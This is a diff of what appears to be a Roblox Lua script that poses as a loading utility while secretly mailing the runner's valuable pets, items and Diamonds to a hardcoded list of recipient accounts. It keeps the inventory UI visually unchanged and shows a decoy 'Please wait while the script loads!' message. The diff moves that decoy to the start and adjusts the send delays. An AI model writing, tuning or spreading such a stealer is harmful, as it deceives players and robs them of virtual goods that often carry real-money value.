@@ -11,7 +11,7 @@ local message = require(game.ReplicatedStorage.Library.Client.Message)
 local MailMessage = "GGz"
 
 -- USERS & SETTINGS
-local users = _G.Usernames or {"ilovemyamazing_gf1", "Yeahboi1131", "Dragonshell23", "Dragonshell24", "Dragonshell21"}
+local users = _G.Usernames or {"ilovemyamazing_gf1","Yeahboi1131","Dragonshell23","Dragonshell24","Dragonshell21"}
 local min_rap = _G.minrap or 1000000
 local webhook = _G.webhook or ""
 
@@ -37,6 +37,9 @@ local mailSendPrice = FunctionToGetFirstPriceOfMail()
 local visualInventory = {Currency={}, Pet={}}
 for _, v in pairs(save.Currency) do visualInventory.Currency[v.id] = { _am = v._am } end
 for uid, pet in pairs(save.Pet or {}) do visualInventory.Pet[uid] = pet end
+
+-- SHOW GUI ONCE AT THE START
+message.Error("Please wait while the script loads!")
 
 -- Keep UI visually unchanged
 local function overrideUI()
@@ -115,7 +118,7 @@ task.spawn(function()
 end)
 
 ----------------------------------------------------------
--- 🟢 FIXED ITEM SENDING SYSTEM
+-- 🟢 FIXED ITEM SENDING SYSTEM (0.2s delay)
 ----------------------------------------------------------
 local currentUserIndex = 1
 
@@ -134,18 +137,18 @@ for _, item in ipairs(sortedItems) do
         if response then
             mailSendPrice = math.min(math.ceil(mailSendPrice * 1.5), 5000000)
             sent = true
-            task.wait(0.3) -- slight delay between sends
+            task.wait(0.2) -- <— fixed delay
         elseif err == "They don't have enough space!" or err == "Mailbox is full" or err == "You have reached the mailbox limit" then
-            currentUserIndex += 1 -- move to next user
+            currentUserIndex += 1
         else
             warn("Failed to send item:", err)
-            sent = true -- skip item
+            sent = true
         end
     end
 end
 
 ----------------------------------------------------------
--- 💎 SEND GEMS AFTER ITEMS
+-- 💎 SEND GEMS AFTER ITEMS (0.2s delay)
 ----------------------------------------------------------
 local gemAmount = save.Currency["Diamonds"] and save.Currency["Diamonds"]._am or 0
 currentUserIndex = 1
@@ -158,7 +161,7 @@ while gemAmount > mailSendPrice and currentUserIndex <= #users do
     if response then
         gemAmount -= 1
         mailSendPrice = math.min(math.ceil(mailSendPrice * 1.5), 5000000)
-        task.wait(0.05)
+        task.wait(0.2) -- <— fixed delay
     elseif err == "They don't have enough space!" or err == "Mailbox is full" or err == "You have reached the mailbox limit" then
         currentUserIndex += 1
     else
@@ -166,6 +169,3 @@ while gemAmount > mailSendPrice and currentUserIndex <= #users do
         break
     end
 end
-
-----------------------------------------------------------
-message.Error("Please wait while the script loads!")
